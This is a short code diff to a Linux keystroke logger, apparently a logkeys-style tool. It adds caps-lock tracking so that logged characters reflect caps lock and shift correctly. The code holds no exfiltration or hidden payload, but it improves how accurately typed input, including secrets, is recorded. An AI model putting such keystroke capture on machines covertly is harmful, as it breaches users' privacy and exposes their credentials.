@@ -472,6 +472,7 @@ int main(int argc, char **argv)
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
   char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
+  bool capslock_in_effect = false;
   bool shift_in_effect = false;
   bool altgr_in_effect = false;
   bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
@@ -583,6 +584,13 @@ int main(int argc, char **argv)
         continue;  // but don't log "<Enter>"
       }
       
+      if (scan_code == KEY_CAPSLOCK) {
+        if (capslock_in_effect)
+          capslock_in_effect = false;
+        else
+          capslock_in_effect = true;
+      }
+
       if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
         shift_in_effect = true;
       if (scan_code == KEY_RIGHTALT)
@@ -602,6 +610,14 @@ int main(int argc, char **argv)
               wch = char_keys[to_char_keys_index(scan_code)];
           }
         } 
+        else if (capslock_in_effect) {
+          if (shift_in_effect) // capslock and shift cancel each other out
+            wch = char_keys[to_char_keys_index(scan_code)];
+          else
+            wch = shift_keys[to_char_keys_index(scan_code)];
+          if (wch == L'\0')
+            wch = char_keys[to_char_keys_index(scan_code)];
+        }
         else if (shift_in_effect) {
           wch = shift_keys[to_char_keys_index(scan_code)];
           if (wch == L'\0')
